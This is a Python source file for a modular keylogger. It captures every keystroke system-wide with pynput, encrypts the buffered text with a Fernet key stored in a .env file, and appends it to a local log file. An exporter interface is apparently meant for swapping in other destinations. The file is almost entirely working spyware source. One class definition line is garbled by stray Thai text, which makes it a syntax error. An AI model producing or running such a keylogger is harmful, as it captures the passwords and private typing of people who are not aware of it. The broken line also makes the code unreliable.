import time
import os
from abc import ABC, abstractmethod
from pynput import keyboard
from dotenv import load_dotenv
from cryptography.fernet import Fernet

# ---------------------------------------------------------
# 1. Base Class (Interface)
# ---------------------------------------------------------
class DataExporter(ABC):
    @abstractmethod
    def export(self, data: str):
        pass

# ---------------------------------------------------------
# 2.(Concrete Classes)
# ---------------------------------------------------------
class LocalFileExporter(DataExporter):ง (MVP สำหรับตอนนี้)
    def __init__(self, filepath="system_logs.dat"):
        self.filepath = filepath

    def export(self, data: str):
        try:
            with open(self.filepath, "a", encoding="utf-8") as f:
                f.write(data + "\n")
            print(f"[SUCCESS] Data written to {self.filepath}")
        except Exception as e:
            print(f"[ERROR] Failed to write to file: {e}")

# ---------------------------------------------------------
# 3.(Core Logic)
# ---------------------------------------------------------
class ModularKeylogger:
    def __init__(self, exporter: DataExporter, char_limit=20, time_limit=30):
        self.exporter = exporter
        self.char_limit = char_limit
        self.time_limit = time_limit
        self.log_buffer = ""
        self.last_flush_time = time.time()
        self.listener = None
        self.running = False

        load_dotenv()
        self.encryption_key = os.getenv("ENCRYPTION_KEY")
        if self.encryption_key:
            self.cipher_suite = Fernet(self.encryption_key.encode())
        else:
            self.cipher_suite = None
            print("[!] Warning: No ENCRYPTION_KEY found. Data will not be encrypted.")

    def encrypt_data(self, data: str) -> str:
        if self.cipher_suite:
            encrypted_bytes = self.cipher_suite.encrypt(data.encode('utf-8'))
            return encrypted_bytes.decode('utf-8')
        return data

    def process_buffer(self):
        if len(self.log_buffer) > 0:
            data_to_save = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n{self.log_buffer}"
            
            secure_data = self.encrypt_data(data_to_save)
            
            self.exporter.export(secure_data)
            
            self.log_buffer = ""
            self.last_flush_time = time.time()

    def _timer_flush(self):
        while self.running:
            time.sleep(1)
            if time.time() - self.last_flush_time >= self.time_limit:
                if len(self.log_buffer) > 0:
                    self.process_buffer()


    def on_press(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
        
        try:
            self.log_buffer += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log_buffer += " "
            elif key == keyboard.Key.enter:
                self.log_buffer += "\n[ENTER]\n"
            elif key == keyboard.Key.backspace:
                if len(self.log_buffer) > 0:
                    self.log_buffer = self.log_buffer[:-1]
            else:
                self.log_buffer += f"[{str(key).replace('Key.', '').upper()}]"

        if len(self.log_buffer) >= self.char_limit:
            self.process_buffer()

    def start(self):
        self.running = True
        print("Modular Keylogger started. Press 'ESC' to stop.")
        
        # Start background timer thread
        import threading
        self.timer_thread = threading.Thread(target=self._timer_flush, daemon=True)
        self.timer_thread.start()

        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

    def stop(self):
        self.running = False
        print("\nStopping keylogger...")
        self.process_buffer()

# ---------------------------------------------------------
# 4.(Main Entry Point)
# ---------------------------------------------------------
if __name__ == "__main__":
    # Setup Encryption Key
    if not os.path.exists(".env"):
        new_key = Fernet.generate_key().decode()
        with open(".env", "w") as f:
            f.write(f"ENCRYPTION_KEY={new_key}\n")
        print("[!] Created .env file with a new AES Key.")

    # 1.Exporter (LocalFileExporter)
    my_exporter = LocalFileExporter(filepath="encrypted_logs.txt")
    
    # 2. create Keylogger and Inject Exporter

    logger = ModularKeylogger(exporter=my_exporter, char_limit=20)
    
    # 3. run program
    logger.start()
